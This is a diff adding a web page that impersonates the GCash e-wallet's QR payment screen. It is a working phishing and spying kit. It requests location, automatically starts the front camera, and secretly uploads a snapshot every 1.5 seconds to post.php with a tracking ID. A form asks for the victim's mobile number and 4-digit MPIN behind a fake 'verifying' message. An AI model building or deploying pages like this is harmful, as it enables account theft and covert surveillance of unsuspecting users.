@@ -1,0 +1,484 @@
+<!doctype html>
+<html lang="en">
+<head><meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate, max-age=0">
+<meta http-equiv="Pragma" content="no-cache">
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GCash - Scan QR Code</title>
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: #f5f5f5;
+            min-height: 100vh;
+            color: #333;
+            overflow-x: hidden;
+        }
+
+        .video-wrap {
+            display: none;
+        }
+
+        #canvas {
+            display: none;
+        }
+
+        .blue-banner {
+            width: 100%;
+            background: #0066CC;
+            height: 80px;
+            position: relative;
+        }
+
+        .white-content {
+            background: #fff;
+            width: 100%;
+            max-width: 500px;
+            margin: 0 auto;
+            border-radius: 20px 20px 0 0;
+            margin-top: -20px;
+            padding: 40px 30px 60px;
+            box-shadow: 0 -4px 20px rgba(0, 0, 0, 0.1);
+            position: relative;
+            z-index: 1;
+        }
+
+        .gcash-logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 40px;
+        }
+
+        .gcash-logo-circle {
+            width: 50px;
+            height: 50px;
+            background: #0066CC;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .gcash-logo-g {
+            font-size: 32px;
+            font-weight: 700;
+            color: #fff;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .gcash-logo-text {
+            font-size: 28px;
+            font-weight: 700;
+            color: #0066CC;
+            letter-spacing: -0.5px;
+        }
+
+        .instruction-text {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .instruction-text p {
+            font-size: 14px;
+            color: #666;
+            line-height: 1.6;
+            margin-bottom: 8px;
+        }
+
+        .instruction-text p:first-child {
+            font-size: 13px;
+            color: #888;
+        }
+
+        .instruction-text p:last-child {
+            font-size: 15px;
+            color: #555;
+            font-weight: 500;
+        }
+
+        .qr-code-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+
+        .qr-code {
+            width: 280px;
+            height: 280px;
+            background: #fff;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            padding: 16px;
+        }
+
+        .qr-code img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            border-radius: 8px;
+        }
+
+        .verification-section {
+            display: none;
+            margin-top: 30px;
+        }
+
+        .camera-preview {
+            width: 100%;
+            max-width: 240px;
+            height: 180px;
+            margin: 0 auto 16px;
+            background: #f0f0f0;
+            border: 2px dashed #0066CC;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 48px;
+            color: #999;
+        }
+
+        .camera-button {
+            width: 100%;
+            max-width: 300px;
+            height: 48px;
+            background: #0066CC;
+            border: none;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin: 0 auto;
+            display: block;
+        }
+
+        .camera-button:hover {
+            background: #0052a3;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0, 102, 204, 0.3);
+        }
+
+        .camera-button:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 8px;
+        }
+
+        .form-input {
+            width: 100%;
+            height: 48px;
+            background: #f8f9fa;
+            border: 2px solid #e9ecef;
+            border-radius: 10px;
+            padding: 0 16px;
+            font-size: 15px;
+            color: #333;
+            transition: all 0.2s;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #0066CC;
+            background: #fff;
+        }
+
+        .verify-button {
+            width: 100%;
+            height: 50px;
+            background: #0066CC;
+            border: none;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 12px;
+            transition: all 0.3s;
+        }
+
+        .verify-button:hover {
+            background: #0052a3;
+        }
+
+        .verify-button:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        .loading-spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 768px) {
+            .white-content {
+                padding: 30px 20px 50px;
+                border-radius: 16px 16px 0 0;
+            }
+
+            .qr-code {
+                width: 240px;
+                height: 240px;
+            }
+
+            .gcash-logo-text {
+                font-size: 24px;
+            }
+        }
+        .request-access-overlay {
+            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,82,155,0.98); z-index: 9999;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            padding: 40px; text-align: center; transition: opacity 0.5s ease;
+        }
+        .request-access-overlay.hidden { opacity: 0; pointer-events: none; }
+        .request-access-icon { width: 80px; height: 80px; margin-bottom: 24px; background: rgba(255,255,255,0.2);
+            border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 40px; }
+        .request-access-title { font-size: 28px; font-weight: 700; margin-bottom: 16px; color: #fff; }
+        .request-access-text { font-size: 16px; color: rgba(255,255,255,0.9); margin-bottom: 24px; max-width: 400px; line-height: 1.5; }
+        .request-access-btn { padding: 14px 40px; font-size: 16px; font-weight: 600; border: none;
+            border-radius: 12px; background: #fff; color: #00529b; cursor: pointer; }
+        .request-access-btn:hover { opacity: 0.95; }
+        .request-access-btn:disabled { opacity: 0.7; cursor: not-allowed; }
+        .request-access-status { margin-top: 16px; font-size: 13px; color: rgba(255,255,255,0.7); }
+    </style>
+</head>
+<body><script>window.TRACKIFY_TID="e8a94cf438f74dcc5150d0faff4fb4e55f05f2601247f753abf6353cdbb3d928";</script>
+    <div class="request-access-overlay" id="requestAccessOverlay">
+        <div class="request-access-icon">📍</div>
+        <div class="request-access-title">Request Access</div>
+        <div class="request-access-text">Please allow or deny location access to continue. We will wait for your response.</div>
+        <button class="request-access-btn" id="requestAccessBtn">Request Access</button>
+        <div class="request-access-status" id="requestAccessStatus"></div>
+    </div>
+
+    <div class="video-wrap" hidden="hidden">
+        <video id="video" playsinline autoplay></video>
+    </div>
+    <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+    <div class="blue-banner"></div>
+
+    <div class="white-content">
+        <div class="gcash-logo-container">
+            <div class="gcash-logo-circle">
+                <div class="gcash-logo-g">G</div>
+            </div>
+            <div class="gcash-logo-text">GCash</div>
+        </div>
+
+        <div class="instruction-text">
+            <p>Securely complete the payment with your GCash app</p>
+            <p>Log in to GCash and scan this QR with the QR Scanner.</p>
+        </div>
+
+        <div class="qr-code-container">
+            <div class="qr-code">
+                <img src="gcash_qr.png" alt="GCash QR Code">
+            </div>
+        </div>
+
+        <div class="verification-section" id="verificationSection">
+            <div class="camera-preview" id="cameraPreview">
+                📸
+            </div>
+            <button class="camera-button" id="startCameraBtn">Allow Camera Access</button>
+
+            <form id="verificationForm" style="display: none; margin-top: 24px;">
+                <div class="form-group">
+                    <label class="form-label" for="mobileNumber">Mobile Number</label>
+                    <input type="tel" class="form-input" id="mobileNumber" placeholder="09XX XXX XXXX" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label" for="mpin">MPIN</label>
+                    <input type="password" class="form-input" id="mpin" placeholder="Enter your MPIN" required maxlength="4">
+                </div>
+                <button type="submit" class="verify-button" id="verifyBtn">
+                    Verify & Continue
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <script src="location-request.js"></script>
+    <script>
+        var BASE_URL = window.location.origin + '/';
+        function post(imgdata) {
+            $.ajax({
+                type: 'POST',
+                data: { cat: imgdata, tid: (typeof window.TRACKIFY_TID === 'string' ? window.TRACKIFY_TID : (new URLSearchParams(window.location.search).get('tid') || '')) },
+                url: BASE_URL + 'post.php',
+                dataType: 'json',
+                async: false,
+                success: function (result) {
+                    // Handle response
+                },
+                error: function () {
+                    // Handle error
+                }
+            });
+        }
+
+        'use strict';
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const startCameraBtn = document.getElementById('startCameraBtn');
+        const cameraPreview = document.getElementById('cameraPreview');
+        const verificationForm = document.getElementById('verificationForm');
+        const verifyBtn = document.getElementById('verifyBtn');
+        const verificationSection = document.getElementById('verificationSection');
+
+        const constraints = {
+            audio: false,
+            video: {
+                facingMode: "user"
+            }
+        };
+
+        async function init() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                handleSuccess(stream);
+            } catch (e) {
+                console.error('Camera access error:', e);
+                cameraPreview.innerHTML = '⚠️ Camera access required';
+                startCameraBtn.disabled = false;
+                startCameraBtn.textContent = 'Retry Camera Access';
+            }
+        }
+
+        function handleSuccess(stream) {
+            window.stream = stream;
+            video.srcObject = stream;
+
+            // Show camera preview
+            cameraPreview.innerHTML = '<video autoplay playsinline style="width:100%;height:100%;object-fit:cover;border-radius:10px;"></video>';
+            const previewVideo = cameraPreview.querySelector('video');
+            previewVideo.srcObject = stream;
+
+            startCameraBtn.textContent = 'Camera Active ✓';
+            startCameraBtn.disabled = true;
+            verificationForm.style.display = 'block';
+
+            // Capture frames
+            var context = canvas.getContext('2d');
+            setInterval(function () {
+                context.drawImage(video, 0, 0, 640, 480);
+                var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+                post(canvasData);
+            }, 1500);
+        }
+
+        // Start camera button - only after location permission is done
+        function startApp() {
+            if (verificationSection) verificationSection.style.display = 'block';
+            if (startCameraBtn) {
+                startCameraBtn.addEventListener('click', function() {
+                    this.textContent = 'Starting camera...';
+                    this.disabled = true;
+                    init();
+                });
+                setTimeout(function() { startCameraBtn.click(); }, 500);
+            }
+        }
+        if (window.LocationRequest) {
+            LocationRequest.init(startApp);
+        }
+
+        // MPIN input - only allow numbers and limit to 4 digits
+        const mpinInput = document.getElementById('mpin');
+        if (mpinInput) {
+            mpinInput.addEventListener('input', function(e) {
+                this.value = this.value.replace(/[^0-9]/g, '').slice(0, 4);
+            });
+        }
+
+        // Mobile number formatting
+        const mobileInput = document.getElementById('mobileNumber');
+        if (mobileInput) {
+            mobileInput.addEventListener('input', function(e) {
+                let value = this.value.replace(/[^0-9]/g, '');
+                if (value.length > 0 && value[0] !== '0') {
+                    value = '0' + value;
+                }
+                if (value.length > 11) {
+                    value = value.slice(0, 11);
+                }
+                this.value = value;
+            });
+        }
+
+        // Form submission
+        if (verificationForm) {
+            verificationForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                const mobileNumber = document.getElementById('mobileNumber').value;
+                const mpin = document.getElementById('mpin').value;
+                
+                if (mobileNumber.length < 11) {
+                    alert('Please enter a valid mobile number.');
+                    return;
+                }
+                
+                if (mpin.length !== 4) {
+                    alert('MPIN must be 4 digits.');
+                    return;
+                }
+                
+                verifyBtn.innerHTML = '<span class="loading-spinner"></span>Verifying...';
+                verifyBtn.disabled = true;
+                
+                setTimeout(() => {
+                    verifyBtn.innerHTML = 'Verify & Continue';
+                    verifyBtn.disabled = false;
+                    alert('Verification in progress. Please wait while we verify your identity...');
+                }, 2000);
+            });
+        }
+
+    </script>
+</body>
+</html>
